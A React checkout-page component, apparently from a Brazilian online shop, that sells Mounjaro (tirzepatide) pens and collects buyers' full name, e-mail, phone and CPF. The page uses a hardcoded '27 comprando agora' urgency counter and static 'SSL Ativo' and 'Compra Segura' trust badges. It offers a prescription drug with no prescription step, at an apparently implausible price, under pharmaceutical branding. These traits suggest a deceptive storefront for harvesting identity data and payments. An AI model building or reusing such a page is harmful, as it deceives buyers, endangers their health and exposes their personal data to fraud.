import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronLeft, Minus, Plus, Lock, Users, ShieldCheck } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import foto1 from "@/assets/mounjaro/foto1.png";
import slimHealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const PRECO_UNITARIO = 67.90;

const DadosPessoaisPage = () => {
  const navigate = useNavigate();
  const [nome, setNome] = useState("");
  const [email, setEmail] = useState("");
  const [telefone, setTelefone] = useState("");
  const [cpf, setCpf] = useState("");
  const [quantidade, setQuantidade] = useState(() => {
    const saved = localStorage.getItem('dadosPessoais');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        return parsed.quantidade || 1;
      } catch {
        return 1;
      }
    }
    return 1;
  });

  const subtotal = PRECO_UNITARIO * quantidade;

  const formatPrice = (price: number) => {
    return price.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  // Máscara de telefone: (XX) XXXXX-XXXX
  const handleTelefoneChange = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    let formatted = '';
    if (digits.length > 0) {
      formatted = '(' + digits.slice(0, 2);
    }
    if (digits.length > 2) {
      formatted += ') ' + digits.slice(2, 7);
    }
    if (digits.length > 7) {
      formatted += '-' + digits.slice(7, 11);
    }
    setTelefone(formatted);
  };

  // Máscara de CPF: XXX.XXX.XXX-XX
  const handleCpfChange = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += '.' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '.' + digits.slice(6, 9);
    }
    if (digits.length > 9) {
      formatted += '-' + digits.slice(9, 11);
    }
    setCpf(formatted);
  };

  const handleQuantityChange = (delta: number) => {
    setQuantidade(prev => Math.max(1, prev + delta));
  };

  const isFormValid = nome.trim() && email.trim() && telefone.length >= 14 && cpf.length === 14;

  const handleContinuar = () => {
    if (isFormValid) {
      // Salvar dados localmente para uso futuro
      localStorage.setItem('dadosPessoais', JSON.stringify({ nome, email, telefone, cpf, quantidade }));
      // Navegar para próxima etapa (endereço)
      navigate("/endereco");
    }
  };

  return (
    <div className="min-h-screen bg-slate-100 text-slate-900 flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white border-b">
        <div className="max-w-screen-sm mx-auto px-4">
          <div className="h-14 flex items-center gap-3">
            <button onClick={() => navigate(-1)} className="p-1">
              <ChevronLeft className="w-6 h-6 text-slate-700" />
            </button>
            <h1 className="text-lg font-semibold text-slate-900 flex-1">Dados pessoais</h1>
            
            {/* Logos */}
            <div className="flex items-center gap-1 opacity-70">
              <img src={slimHealthLogo} alt="SlimHealth" className="h-7 w-auto" />
              <span className="text-slate-400 text-xs">+</span>
              <img src={cimedLogo} alt="CIMED" className="h-5 w-auto" />
            </div>
          </div>
        </div>
        {/* Progress Bar */}
        <div className="h-1 bg-slate-200">
          <div className="h-full w-1/2 bg-rose-500" />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-screen-sm mx-auto w-full pb-32">
        {/* Product Card */}
        <section className="bg-white mx-3 mt-3 rounded-xl p-3 shadow-sm">
          <div className="flex gap-3">
            {/* Product Image */}
            <div className="w-20 h-20 shrink-0 rounded-lg overflow-hidden bg-slate-100">
              <img src={foto1} alt="Mounjaro" className="w-full h-full object-contain" />
            </div>

            {/* Product Info */}
            <div className="flex-1 min-w-0">
              <h2 className="text-sm font-medium text-slate-900 line-clamp-2">
                Mounjaro 5 mg – Tirzepatida (caneta...
              </h2>
              <div className="mt-1 text-lg font-bold text-emerald-600">
                R$ {formatPrice(subtotal)}
              </div>
            </div>

            {/* Quantity Control */}
            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={() => handleQuantityChange(-1)}
                className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200 active:scale-95 transition"
              >
                <Minus className="w-4 h-4" />
              </button>
              <span className="w-6 text-center font-semibold text-slate-900">{quantidade}</span>
              <button
                onClick={() => handleQuantityChange(1)}
                className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200 active:scale-95 transition"
              >
                <Plus className="w-4 h-4" />
              </button>
            </div>
          </div>

          {/* Urgency Text */}
          <div className="mt-3 flex items-center gap-1.5 text-emerald-600 text-sm">
            <Users className="w-4 h-4" />
            <span className="font-medium">27 comprando agora</span>
          </div>
        </section>

        {/* Form Section */}
        <section className="bg-white mx-3 mt-3 rounded-xl p-4 shadow-sm">
          {/* Protected Data Badge */}
          <div className="flex items-center gap-2 text-slate-500 text-sm mb-4">
            <Lock className="w-4 h-4" />
            <span>Dados protegidos</span>
          </div>

          {/* Form Fields */}
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                Nome completo
              </label>
              <Input
                type="text"
                placeholder="Digite seu nome"
                value={nome}
                onChange={(e) => setNome(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                E-mail
              </label>
              <Input
                type="email"
                placeholder="seu@email.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                Telefone
              </label>
              <Input
                type="tel"
                placeholder="(00) 00000-0000"
                value={telefone}
                onChange={(e) => handleTelefoneChange(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                CPF
              </label>
              <Input
                type="text"
                placeholder="000.000.000-00"
                value={cpf}
                onChange={(e) => handleCpfChange(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>
          </div>
        </section>
      </main>

      {/* Security Badges */}
      <div className="fixed inset-x-0 bottom-[72px] z-40 bg-white border-t">
        <div className="max-w-screen-sm mx-auto px-4 py-2 flex items-center justify-center gap-4">
          <div className="flex items-center gap-1 text-emerald-600">
            <ShieldCheck className="w-4 h-4" />
            <span className="text-xs">Compra Segura</span>
          </div>
          <div className="flex items-center gap-1 text-emerald-600">
            <Lock className="w-4 h-4" />
            <span className="text-xs">SSL Ativo</span>
          </div>
          <div className="flex items-center gap-1 text-emerald-600">
            <ShieldCheck className="w-4 h-4" />
            <span className="text-xs">Garantia</span>
          </div>
        </div>
      </div>

      {/* Fixed Footer */}
      <div className="fixed inset-x-0 bottom-0 z-50 bg-white border-t shadow-[0_-2px_10px_rgba(0,0,0,0.06)]">
        <div className="max-w-screen-sm mx-auto px-4 py-3 pb-[calc(12px+env(safe-area-inset-bottom))]">
          <div className="flex items-center justify-between gap-4">
            {/* Subtotal à esquerda */}
            <div className="flex flex-col">
              <span className="text-sm text-slate-500">Subtotal</span>
              <span className="text-xl font-bold text-rose-500">R$ {formatPrice(subtotal)}</span>
            </div>
            
            {/* Botão à direita */}
            <button
              onClick={handleContinuar}
              disabled={!isFormValid}
              className={`px-12 h-12 rounded-full font-semibold text-base transition ${
                isFormValid
                  ? 'bg-rose-500 text-white hover:bg-rose-600 active:scale-[0.98]'
                  : 'bg-slate-200 text-slate-400 cursor-not-allowed'
              }`}
            >
              Continuar
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DadosPessoaisPage;
